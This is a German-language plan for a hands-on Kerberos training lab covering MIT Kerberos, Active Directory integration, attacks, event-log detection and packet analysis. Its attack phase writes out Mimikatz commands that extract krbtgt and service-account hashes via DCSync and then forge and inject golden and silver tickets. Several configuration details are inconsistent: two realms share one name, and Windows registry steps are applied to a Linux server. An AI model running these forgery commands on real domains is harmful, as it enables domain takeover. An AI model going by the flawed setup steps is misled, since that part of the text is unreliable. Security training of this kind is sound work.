# Interaktive Übung: Kerberos-Implementierungs-Labor
## Von der Theorie zur Praxis: Den dreiköpfigen Höllenhund zähmen

---

## Labor-Konzept (120 Minuten)

**Ziel:** Teilnehmende implementieren ein funktionsfähiges Kerberos-System von Grund auf und erleben dabei die technischen Herausforderungen, Sicherheitsaspekte und Angriffsvektoren der Enterprise-Authentifizierung.

**Format:** Progressive Implementation mit Live-Server-Setup, Packet-Capture-Analyse und praktischen Penetration-Tests

**Teilnehmerzahl:** 12-18 Personen (Teams zu je 2-3 Personen)

**Infrastruktur:** Virtualisierte Domain-Umgebung, Linux MIT Kerberos, Windows Active Directory, Wireshark

---

## Lab-Umgebung & Setup (20 Minuten)

### Virtualisierte Infrastruktur

**Für jedes Team (2-3 Personen):**

#### Windows Domain Controller (DC01)
- **OS:** Windows Server 2022
- **Rolle:** Active Directory Domain Services, DNS, Kerberos KDC
- **Domain:** KRBLAB.LOCAL
- **IP:** 192.168.100.10/24
- **Accounts:** Administrator, alice, bob, webservice, sqlservice

#### Linux Kerberos Client (CLIENT01)
- **OS:** Ubuntu 22.04 LTS
- **Packages:** krb5-user, krb5-config, heimdal-clients
- **IP:** 192.168.100.20/24
- **Purpose:** MIT Kerberos client implementation

#### Windows Client (CLIENT02)  
- **OS:** Windows 11 Enterprise
- **Domain-joined:** KRBLAB.LOCAL
- **IP:** 192.168.100.30/24
- **Purpose:** Windows native Kerberos testing

#### Application Server (WEB01)
- **OS:** CentOS Stream 9
- **Services:** Apache HTTP Server with mod_auth_kerb
- **IP:** 192.168.100.40/24
- **SPN:** HTTP/web01.krblab.local

### Initial Lab Setup
```bash
# Jedes Team erhält vorkonfigurierte VMs
# SSH-Zugang zu allen Linux-Systemen
# RDP-Zugang zu Windows-Systemen
# Shared Folder für Tools und Dokumentation

# Netzwerk-Tools auf allen Systemen:
# - Wireshark/tshark für Packet-Capture
# - Kerberos-Client-Tools (kinit, klist, kdestroy)
# - Text-Editoren und basic troubleshooting tools
```

### Team-Zuweisungen
```
Team 1: "Cerberus Guards" - Basic Kerberos Setup
Team 2: "Ticket Masters" - Cross-Platform Integration  
Team 3: "PAC Hunters" - Windows PAC Analysis
Team 4: "Golden Hackers" - Golden Ticket Attack Lab
Team 5: "Silver Shadows" - Silver Ticket Attack Lab
Team 6: "Delegation Demons" - Kerberos Delegation Lab
```

---

## Phase 1: MIT Kerberos von Grund auf (30 Minuten)

### Lab 1.1: KDC Setup und Realm Creation (15 Min)

**Team-Challenge:** Konfiguriert einen MIT Kerberos KDC von Grund auf

```bash
# Auf CLIENT01 (Linux) - MIT Kerberos Setup
sudo apt update && sudo apt install -y krb5-kdc krb5-admin-server

# 1. Kerberos-Konfiguration erstellen
sudo nano /etc/krb5.conf
```

**Aufgabe: Konfiguriert /etc/krb5.conf:**
```ini
[libdefaults]
    default_realm = KRBLAB.LOCAL
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 10h
    renew_lifetime = 7d

[realms]
    KRBLAB.LOCAL = {
        kdc = 192.168.100.20:88
        admin_server = 192.168.100.20:749
        default_domain = krblab.local
        database_module = openldap_ldapconf
    }

[domain_realm]
    .krblab.local = KRBLAB.LOCAL
    krblab.local = KRBLAB.LOCAL

[logging]
    kdc = FILE:/var/log/krb5kdc.log
    admin_server = FILE:/var/log/kadmin.log
    default = FILE:/var/log/krb5lib.log
```

**KDC-Datenbank initialisieren:**
```bash
# 2. Kerberos-Datenbank erstellen
sudo kdb5_util create -s -r KRBLAB.LOCAL
# Passwort für Master Key: KerberosLabMaster2025!

# 3. Administrative Principals erstellen
sudo kadmin.local -q "addprinc admin/admin"
# Passwort: AdminKrb2025!

sudo kadmin.local -q "addprinc alice"
sudo kadmin.local -q "addprinc bob"
sudo kadmin.local -q "addprinc HTTP/web01.krblab.local"

# 4. KDC-Services starten
sudo systemctl enable krb5-kdc krb5-admin-server
sudo systemctl start krb5-kdc krb5-admin-server
```

**Test der KDC-Funktionalität:**
```bash
# Authentifizierung testen
kinit alice
# Passwort eingeben

# Tickets anzeigen
klist -v

# Erwartetes Ergebnis:
# Ticket cache: FILE:/tmp/krb5cc_1000
# Default principal: alice@KRBLAB.LOCAL
# Valid starting     Expires            Service principal
# 09/22/25 14:00:00  09/23/25 00:00:00  krbtgt/KRBLAB.LOCAL@KRBLAB.LOCAL
#     renew until 09/29/25 14:00:00
```

### Lab 1.2: Service Principal und Keytab Creation (15 Min)

**Aufgabe:** Erstellt Service Principals und Keytab-Dateien

```bash
# Service-Accounts erstellen
sudo kadmin.local -q "addprinc -randkey HTTP/web01.krblab.local"
sudo kadmin.local -q "addprinc -randkey host/web01.krblab.local"

# Keytab-Dateien generieren  
sudo kadmin.local -q "ktadd -k /etc/krb5.keytab HTTP/web01.krblab.local"
sudo kadmin.local -q "ktadd -k /etc/krb5.keytab host/web01.krblab.local"

# Keytab-Inhalt überprüfen
sudo klist -k /etc/krb5.keytab

# Expected Output:
# Keytab name: FILE:/etc/krb5.keytab
# KVNO Principal
# ---- ----------
#    2 HTTP/web01.krblab.local@KRBLAB.LOCAL
#    2 host/web01.krblab.local@KRBLAB.LOCAL
```

**Service-Authentication testen:**
```bash
# Als Service authentifizieren
sudo kinit -k -t /etc/krb5.keytab HTTP/web01.krblab.local

# Service-Ticket validieren
klist
sudo kdestroy
```

**Challenge-Frage für Teams:** 
*"Warum brauchen wir separate Service Principals für HTTP/ und host/? Was passiert, wenn wir sie verwechseln?"*

---

## Phase 2: Windows Active Directory Integration (25 Minuten)

### Lab 2.1: Cross-Platform Kerberos Trust (12 Min)

**Aufgabe:** Verbindet MIT Kerberos mit Windows Active Directory

```powershell
# Auf DC01 (Windows Server) - PowerShell als Administrator
# 1. MIT Kerberos Realm als externes Vertrauen hinzufügen

# Realm-Trust erstellen
netdom trust KRBLAB.LOCAL /Domain:krblab.local /add /realm /passwordt:TrustPassword2025!

# DNS-Einträge für MIT KDC hinzufügen
Add-DnsServerResourceRecord -ZoneName "krblab.local" -Name "_kerberos._tcp" -CName "client01.krblab.local"
Add-DnsServerResourceRecord -ZoneName "krblab.local" -Name "_kpasswd._tcp" -CName "client01.krblab.local"
```

**Linux-Client für AD-Integration konfigurieren:**
```bash
# Auf CLIENT01 - krb5.conf für AD erweitern
sudo nano /etc/krb5.conf

# Realm-Sektion erweitern:
[realms]
    KRBLAB.LOCAL = {
        kdc = 192.168.100.20:88
        admin_server = 192.168.100.20:749
    }
    
    KRBLAB.LOCAL = {
        kdc = dc01.krblab.local:88
        admin_server = dc01.krblab.local:88
        default_domain = krblab.local
    }

[capaths]
    KRBLAB.LOCAL = {
        KRBLAB.LOCAL = .
    }
```

### Lab 2.2: PAC-Analyse mit Windows-Kerberos (13 Min)

**Aufgabe:** Analysiert Windows PAC-Strukturen mit echten Tickets

```powershell
# Auf CLIENT02 (Windows 11)
# 1. Als Domain-User anmelden und Tickets analysieren

# Aktuelle Tickets anzeigen  
klist

# Detailed ticket information
klist -li 0x3e7

# Expected PAC information in output:
# #0>     Client: alice @ KRBLAB.LOCAL
#         Server: krbtgt/KRBLAB.LOCAL @ KRBLAB.LOCAL
#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
#         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
#         Start Time: 9/22/2025 14:00:00 (local)
#         End Time:   9/23/2025 0:00:00 (local)
#         Renew Time: 9/29/2025 14:00:00 (local)
#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
#         Cache Flags: 0x1 -> PRIMARY
#         Kdc Called: dc01.krblab.local
```

**PAC-Dekodierung mit PowerShell:**
```powershell
# Advanced PAC Analysis Script
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
Add-Type -AssemblyName System.Security

function Get-KerberosPAC {
    param([string]$Username)
    
    # Get current user's PAC information
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $Groups = $CurrentUser.Groups
    
    Write-Host "PAC Analysis for $Username" -ForegroundColor Green
    Write-Host "User SID: $($CurrentUser.User.Value)"
    Write-Host "Authentication Type: $($CurrentUser.AuthenticationType)"
    
    Write-Host "`nGroup Memberships (from PAC):" -ForegroundColor Yellow
    foreach ($Group in $Groups) {
        try {
            $GroupName = $Group.Translate([System.Security.Principal.NTAccount])
            Write-Host "  $($Group.Value) → $GroupName"
        } catch {
            Write-Host "  $($Group.Value) → [Unknown Group]"
        }
    }
    
    # Check for high-privilege groups
    $HighPrivGroups = @(
        "S-1-5-32-544",  # Administrators
        "S-1-5-21-*-512", # Domain Admins  
        "S-1-5-21-*-519"  # Enterprise Admins
    )
    
    $IsHighPriv = $false
    foreach ($Group in $Groups) {
        foreach ($PrivGroup in $HighPrivGroups) {
            if ($Group.Value -like $PrivGroup) {
                $IsHighPriv = $true
                Write-Host "⚠️  HIGH PRIVILEGE GROUP DETECTED: $($Group.Value)" -ForegroundColor Red
            }
        }
    }
    
    return @{
        UserSID = $CurrentUser.User.Value
        Groups = $Groups
        IsHighPrivilege = $IsHighPriv
    }
}

# Ausführen
$PACInfo = Get-KerberosPAC -Username $env:USERNAME
```

**Hands-On Challenge:**
Teams müssen die Unterschiede zwischen MIT Kerberos (ohne PAC) und Windows Kerberos (mit PAC) dokumentieren und erklären, warum Windows PAC für Authorization benötigt.

---

## Phase 3: Kerberos-Angriffe praktisch durchführen (30 Minuten)

### Lab 3.1: Golden Ticket Attack Simulation (15 Min)

**⚠️ WICHTIGER HINWEIS:** Diese Übung erfolgt ausschließlich in der kontrollierten Lab-Umgebung zu Bildungszwecken!

**Vorbereitung - krbtgt Hash extrahieren:**
```powershell
# Auf DC01 - Mimikatz für Educational Purposes
# Download: https://github.com/gentilkiwi/mimikatz (official repo)

# Als Domain Admin ausführen
.\mimikatz.exe

# krbtgt Hash extrahieren (Educational Lab Only!)
lsadump::dcsync /domain:krblab.local /user:krbtgt

# Output enthält:
# Hash NTLM: a1b2c3d4e5f6... (32 hex chars)
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890
```

**Golden Ticket erstellen:**
```cmd
# Mit Mimikatz Golden Ticket generieren
kerberos::golden /user:fakeadmin /domain:krblab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6... /ticket:golden.kirbi

# Golden Ticket in Speicher laden
kerberos::ptt golden.kirbi

# Testen - Domain Controller zugreifen
dir \\dc01\c$

# Erwartung: Erfolgreicher Zugriff trotz fake user!
```

**Golden Ticket Detection Challenge:**
```powershell
# Teams müssen Detection-Script erstellen
function Detect-GoldenTicket {
    param([string]$LogPath = "C:\Windows\System32\winevt\Logs\Security.evtx")
    
    # Event ID 4768: Kerberos TGT Request
    # Event ID 4769: Kerberos Service Ticket Request  
    # Verdächtige Muster suchen:
    
    $Events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768,4769} | Select-Object -First 100
    
    foreach ($Event in $Events) {
        $EventXML = [xml]$Event.ToXml()
        $EventData = $EventXML.Event.EventData.Data
        
        # Golden Ticket Indicators:
        # 1. Ticket Lifetime > 10 hours
        # 2. Unusual encryption type
        # 3. Missing initial authentication (4768) before service access (4769)
        
        # TODO: Implementieren Sie Detection Logic
    }
}

# Teams implementieren die Detection-Logic
```

### Lab 3.2: Silver Ticket Attack & Defense (15 Min)

**Service Account Hash extrahieren:**
```powershell
# Service Account Hash für Silver Ticket
lsadump::dcsync /domain:krblab.local /user:webservice

# Output: Service Account NTLM Hash
```

**Silver Ticket für HTTP Service:**
```cmd
# Silver Ticket für HTTP/web01.krblab.local erstellen
kerberos::golden /user:alice /domain:krblab.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:web01.krblab.local /service:HTTP /rc4:service_ntlm_hash /ticket:silver_http.kirbi

# Silver Ticket laden
kerberos::ptt silver_http.kirbi

# Web-Service direkt zugreifen (ohne KDC!)
curl http://web01.krblab.local/secure/
```

**PAC Validation Defense:**
```powershell
# Auf WEB01 - PAC Validation aktivieren
# Registry-Einstellung für PAC Validation
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "ValidateKdcPacSignature" -Value 1 -PropertyType DWord

# Service neu starten
Restart-Service HTTP

# Silver Ticket sollte jetzt fehlschlagen!
```

**Detection & Monitoring:**
```bash
# Linux-basierte Detection mit tcpdump
# Kerberos-Traffic capture
sudo tcpdump -i eth0 -w kerberos_traffic.pcap port 88

# Wireshark-Analyse
wireshark kerberos_traffic.pcap

# Teams analysieren:
# 1. Normale Kerberos-Authentifizierung vs. Silver Ticket
# 2. Fehlende KDC-Kommunikation bei Silver Tickets
# 3. PAC Validation Failures in Event Logs
```

---

## Phase 4: Advanced Kerberos Features (25 Minuten)

### Lab 4.1: Kerberos Delegation Configuration (12 Min)

**Unconstrained Delegation Setup:**
```powershell
# Auf DC01 - Unconstrained Delegation konfigurieren
$WebServer = Get-ADComputer "WEB01"
Set-ADAccountControl -Identity $WebServer -TrustedForDelegation $true

# Verification
Get-ADComputer "WEB01" -Properties TrustedForDelegation | Select-Object Name,TrustedForDelegation
```

**Resource-Based Constrained Delegation:**
```powershell
# Moderne RBCD-Konfiguration
$WebServer = Get-ADComputer "WEB01"  
$SqlServer = Get-ADComputer "CLIENT01" # Simuliert SQL Server

# RBCD: WEB01 darf zu CLIENT01 delegieren
Set-ADComputer $SqlServer -PrincipalsAllowedToDelegateToAccount $WebServer

# Verifikation
Get-ADComputer $SqlServer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Delegation Testing:**
```python
#!/usr/bin/env python3
# Delegation Test Script
import subprocess
import sys

def test_delegation(target_service):
    """Test Kerberos delegation to target service"""
    
    try:
        # Get service ticket with delegation
        result = subprocess.run([
            'kinit', '-S', target_service, '-f'  # -f requests forwardable ticket
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"✅ Delegation to {target_service} successful")
            
            # Show tickets
            tickets = subprocess.run(['klist'], capture_output=True, text=True)
            print("Current tickets:")
            print(tickets.stdout)
            
        else:
            print(f"❌ Delegation to {target_service} failed:")
            print(result.stderr)
            
    except Exception as e:
        print(f"Error testing delegation: {e}")

if __name__ == "__main__":
    test_delegation("HTTP/web01.krblab.local")
```

### Lab 4.2: Keytab Management & Cross-Platform Services (13 Min)

**Advanced Keytab Operations:**
```bash
# Multi-Principal Keytabs erstellen
sudo kadmin.local -q "ktadd -k /etc/httpd/httpd.keytab HTTP/web01.krblab.local"
sudo kadmin.local -q "ktadd -k /etc/httpd/httpd.keytab HTTP/web01"

# Keytab-Sicherheit
sudo chown apache:apache /etc/httpd/httpd.keytab
sudo chmod 400 /etc/httpd/httpd.keytab

# Keytab-Rotation
sudo kadmin.local -q "change_password -randkey HTTP/web01.krblab.local"
sudo kadmin.local -q "ktadd -k /etc/httpd/httpd.keytab HTTP/web01.krblab.local"
```

**Apache Kerberos Integration:**
```apache
# /etc/httpd/conf.d/kerberos.conf
LoadModule auth_kerb_module modules/mod_auth_kerb.so

<VirtualHost *:80>
    ServerName web01.krblab.local
    DocumentRoot /var/www/html
    
    <Directory "/var/www/html/secure">
        AuthType Kerberos
        AuthName "Kerberos Authentication Required"
        
        KrbMethodNegotiate On
        KrbMethodK5Passwd Off
        KrbServiceName HTTP
        KrbAuthRealms KRBLAB.LOCAL
        
        Krb5KeyTab /etc/httpd/httpd.keytab
        KrbSaveCredentials On
        
        Require valid-user
        
        # Log authentication details
        LogLevel auth_kerb:debug
    </Directory>
</VirtualHost>
```

**Cross-Platform Authentication Test:**
```bash
#!/bin/bash
# Cross-Platform Kerberos Test Suite

echo "=== Cross-Platform Kerberos Authentication Test ==="

# Test 1: Linux to Linux
echo "Test 1: Linux MIT Kerberos client to Linux service"
kinit alice@KRBLAB.LOCAL
curl -v --negotiate -u : http://web01.krblab.local/secure/

# Test 2: Linux to Windows
echo "Test 2: Linux client to Windows service"  
curl -v --negotiate -u : http://dc01.krblab.local/

# Test 3: Windows to Linux
echo "Test 3: Windows client to Linux service"
# (Execute from Windows client)
# Invoke-WebRequest -Uri "http://web01.krblab.local/secure/" -UseDefaultCredentials

# Test 4: Service-to-Service delegation
echo "Test 4: Service delegation test"
# TODO: Implement delegation test

echo "=== Results ==="
klist
```

---

## Phase 5: Monitoring & Forensics (15 Minuten)

### Lab 5.1: Kerberos Event Analysis (8 Min)

**Windows Event Log Analysis:**
```powershell
# Comprehensive Kerberos Event Analysis
function Analyze-KerberosEvents {
    param(
        [int]$Hours = 1,
        [string[]]$EventIDs = @(4768, 4769, 4771, 4776, 4625)
    )
    
    $StartTime = (Get-Date).AddHours(-$Hours)
    
    $Events = Get-WinEvent -FilterHashtable @{
        LogName = 'Security'
        ID = $EventIDs
        StartTime = $StartTime
    } -ErrorAction SilentlyContinue
    
    $Analysis = @{}
    
    foreach ($Event in $Events) {
        $EventXML = [xml]$Event.ToXml()
        $EventData = @{}
        
        foreach ($Data in $EventXML.Event.EventData.Data) {
            $EventData[$Data.Name] = $Data.'#text'
        }
        
        switch ($Event.Id) {
            4768 { # TGT Request
                $Key = "$($EventData.TargetUserName)_TGT"
                if (-not $Analysis[$Key]) { $Analysis[$Key] = @() }
                $Analysis[$Key] += @{
                    Time = $Event.TimeCreated
                    Type = "TGT_REQUEST"
                    User = $EventData.TargetUserName
                    Result = $EventData.Status
                    ClientIP = $EventData.IpAddress
                    PreAuth = $EventData.PreAuthType
                }
            }
            
            4769 { # Service Ticket Request
                $Key = "$($EventData.TargetUserName)_ST_$($EventData.ServiceName)"
                if (-not $Analysis[$Key]) { $Analysis[$Key] = @() }
                $Analysis[$Key] += @{
                    Time = $Event.TimeCreated
                    Type = "SERVICE_TICKET"
                    User = $EventData.TargetUserName
                    Service = $EventData.ServiceName
                    Result = $EventData.Status
                    ClientIP = $EventData.IpAddress
                }
            }
            
            4771 { # Pre-auth failed
                Write-Host "⚠️ Pre-authentication failure for $($EventData.TargetUserName)" -ForegroundColor Yellow
            }
        }
    }
    
    # Anomaly Detection
    Write-Host "`n=== ANOMALY DETECTION ===" -ForegroundColor Red
    
    # Look for Golden Ticket indicators
    $TGTRequests = $Events | Where-Object {$_.Id -eq 4768}
    $ServiceRequests = $Events | Where-Object {$_.Id -eq 4769}
    
    # Service requests without TGT requests (possible offline ticket)
    foreach ($ServiceReq in $ServiceRequests) {
        $ServiceXML = [xml]$ServiceReq.ToXml()
        $ServiceUser = $ServiceXML.Event.EventData.Data | Where-Object {$_.Name -eq "TargetUserName"} | Select-Object -ExpandProperty '#text'
        
        $HasTGT = $TGTRequests | Where-Object {
            $TGTXML = [xml]$_.ToXml()
            $TGTUser = $TGTXML.Event.EventData.Data | Where-Object {$_.Name -eq "TargetUserName"} | Select-Object -ExpandProperty '#text'
            return $TGTUser -eq $ServiceUser -and $_.TimeCreated -ge $ServiceReq.TimeCreated.AddMinutes(-10)
        }
        
        if (-not $HasTGT) {
            Write-Host "🚨 POTENTIAL GOLDEN/SILVER TICKET: Service access without recent TGT for user $ServiceUser" -ForegroundColor Red
        }
    }
    
    return $Analysis
}

# Execute analysis
$KerberosAnalysis = Analyze-KerberosEvents -Hours 2
```

### Lab 5.2: Network Traffic Analysis (7 Min)

**Wireshark Kerberos Deep-Dive:**
```bash
# Capture Kerberos traffic
sudo tshark -i eth0 -w kerberos_analysis.pcap -f "port 88 or port 464"

# Live analysis
sudo tshark -i eth0 -f "port 88" -Y "kerberos" -T fields \
    -e frame.time \
    -e ip.src \
    -e ip.dst \
    -e kerberos.msg_type \
    -e kerberos.realm \
    -e kerberos.cname_string \
    -e kerberos.sname_string
```

**Python Packet Analysis:**
```python
#!/usr/bin/env python3
import pyshark
from datetime import datetime

def analyze_kerberos_traffic(pcap_file):
    """Analyze Kerberos traffic patterns"""
    
    capture = pyshark.FileCapture(pcap_file, display_filter='kerberos')
    
    events = []
    
    for packet in capture:
        try:
            if hasattr(packet, 'kerberos'):
                event = {
                    'time': packet.sniff_time,
                    'src_ip': packet.ip.src,
                    'dst_ip': packet.ip.dst,
                    'msg_type': getattr(packet.kerberos, 'msg_type', 'Unknown'),
                    'realm': getattr(packet.kerberos, 'realm', 'Unknown'),
                    'client': getattr(packet.kerberos, 'cname_string', 'Unknown'),
                    'service': getattr(packet.kerberos, 'sname_string', 'Unknown')
                }
                events.append(event)
        except AttributeError:
            continue
    
    # Analysis
    print("=== KERBEROS TRAFFIC ANALYSIS ===")
    
    # Group by message type
    msg_types = {}
    for event in events:
        msg_type = event['msg_type']
        if msg_type not in msg_types:
            msg_types[msg_type] = []
        msg_types[msg_type].append(event)
    
    for msg_type, msgs in msg_types.items():
        print(f"\n{msg_type}: {len(msgs)} messages")
        for msg in msgs[:5]:  # Show first 5
            print(f"  {msg['time']} {msg['src_ip']} → {msg['dst_ip']} "
                  f"Client: {msg['client']} Service: {msg['service']}")
    
    # Anomaly detection
    print("\n=== ANOMALIES ===")
    
    # Look for unusual patterns
    clients = {}
    for event in events:
        client = event['client']
        if client not in clients:
            clients[client] = []
        clients[client].append(event)
    
    for client, client_events in clients.items():
        if len(client_events) > 100:  # High activity
            print(f"⚠️ High activity from client {client}: {len(client_events)} requests")
    
    capture.close()
    return events

# Usage
# events = analyze_kerberos_traffic("kerberos_analysis.pcap")
```

---

## Wrap-Up & Evaluation (5 Minuten)

### Team-Präsentationen (3 Min pro Team)

**Jedes Team präsentiert:**
1. **Implementierung:** Was haben Sie erfolgreich konfiguriert?
2. **Herausforderungen:** Welche Probleme sind aufgetreten und wie wurden sie gelöst?
3. **Sicherheits-Insights:** Was haben Sie über Kerberos-Angriffe gelernt?
4. **Detection:** Welche Monitoring-Strategien haben Sie implementiert?

**Präsentationsformat:**
- 2 Minuten Live-Demo ihrer Kerberos-Implementierung
- 1 Minute Lessons Learned und Sicherheitsempfehlungen

### Competitive Challenge: "Hunt the Golden Ticket"

**Final Challenge (Bonus):**
```bash
# Jedes Team erhält eine kompromittierte Umgebung
# Aufgabe: Identifiziert alle Arten von Kerberos-Angriffen
# - Golden Tickets
# - Silver Tickets  
# - Delegation-Missbrauch
# - Kompromittierte Service Accounts

# Scoring:
# +10 Punkte pro korrekt identifiziertem Angriff
# +5 Punkte pro korrekter Remediation
# +3 Punkte pro implementierter Detection Rule
```

### Lessons Learned Sammlung

**Gemeinsame Erkenntnisse:**
- **Komplexität:** Kerberos ist deutlich komplexer als zunächst angenommen
- **Cross-Platform-Challenges:** Integration zwischen MIT und Windows Kerberos
- **Security vs. Usability:** Balance zwischen Sicherheit und Benutzerfreundlichkeit
- **Monitoring Importance:** Ohne umfassendes Monitoring sind Angriffe schwer erkennbar

**Technische Insights:**
- **Time Synchronization:** Kritisch für Kerberos-Funktionalität
- **PAC Validation:** Essential für Silver Ticket Defense
- **Delegation Complexity:** RBCD ist sicherer, aber komplexer zu konfigurieren
- **Event Correlation:** Single events sind wenig aussagekräftig - Muster sind wichtig

### Praktische Take-Aways

**Für Administratoren:**
1. **Monitoring:** Implementieren Sie umfassendes Kerberos-Event-Monitoring
2. **Delegation:** Verwenden Sie RBCD statt Unconstrained Delegation
3. **Service Accounts:** Verwenden Sie Managed Service Accounts wo möglich
4. **Time Sync:** Stellen Sie NTP-Synchronisation sicher

**Für Security Teams:**
1. **Detection:** Entwickeln Sie Behavioral Analytics für Kerberos
2. **Incident Response:** Bereiten Sie Playbooks für Golden/Silver Ticket vor
3. **Pen Testing:** Integrieren Sie Kerberos-Angriffe in Security Assessments
4. **Training:** Sorgen Sie für regelmäßige Kerberos-Security-Schulungen

### Lab-Environment Cleanup

```bash
# Cleanup-Script für alle Teams
#!/bin/bash
echo "=== Kerberos Lab Cleanup ==="

# Stop services
sudo systemctl stop krb5-kdc krb5-admin-server
sudo systemctl stop httpd

# Archive logs for analysis
sudo tar czf kerberos_lab_logs_$(date +%Y%m%d_%H%M%S).tar.gz \
    /var/log/krb5* \
    /var/log/httpd/* \
    /var/log/audit/* \
    *.pcap

# Reset keytabs
sudo rm -f /etc/krb5.keytab /etc/httpd/httpd.keytab

# Clear credential caches
kdestroy -A

echo "Lab cleanup complete. Logs archived for further analysis."
```

### Advanced Challenges (Take-Home)

**Für ambitionierte Teams:**

1. **Post-Quantum Kerberos:** Implementieren Sie experimental PQ-Krypto in MIT Kerberos
2. **Container Integration:** Deployen Sie Kerberos in Kubernetes mit Helm Charts
3. **SIEM Integration:** Entwickeln Sie Splunk/ELK queries für Kerberos-Anomalien  
4. **Automated Response:** Schreiben Sie Scripts für automatische Golden Ticket Mitigation

### Evaluation & Feedback

**Lab-Assessment-Kriterien:**
- **Technical Implementation (40%):** Funktionalität der Kerberos-Setups
- **Security Understanding (30%):** Verständnis von Angriffen und Defenses
- **Problem Solving (20%):** Umgang mit auftretenden Problemen
- **Presentation (10%):** Qualität der Erkenntnisse und Präsentation

**Post-Lab Survey:**
1. Welches war das größte "Aha!"-Erlebnis?
2. Was war die frustrierendste technische Herausforderung?
3. Wie würden Sie Kerberos in Ihrem Unternehmen implementieren?
4. Welche zusätzlichen Tools oder Dokumentationen hätten geholfen?

---

**Dieses Labor macht die theoretischen Konzepte von Kerberos greifbar erlebbar und vermittelt sowohl die technischen Möglichkeiten als auch die praktischen Sicherheitsherausforderungen der modernen Enterprise-Authentifizierung!**

### Ressourcen für weiteres Lernen

**Dokumentation & Referenzen:**
- MIT Kerberos Documentation: https://web.mit.edu/kerberos/
- Microsoft Kerberos Technical Reference
- RFC 4120: The Kerberos Network Authentication Service (V5)
- SANS Kerberos Attack Cheat Sheet

**Tools & Software:**
- Mimikatz (für Penetration Testing)
- Responder (für Network Analysis)
- BloodHound (für AD Enumeration)
- Wireshark Kerberos Dissector

**Community & Support:**
- MIT Kerberos Mailing Lists
- Microsoft TechCommunity Kerberos Forum
- SANS Community für Kerberos Security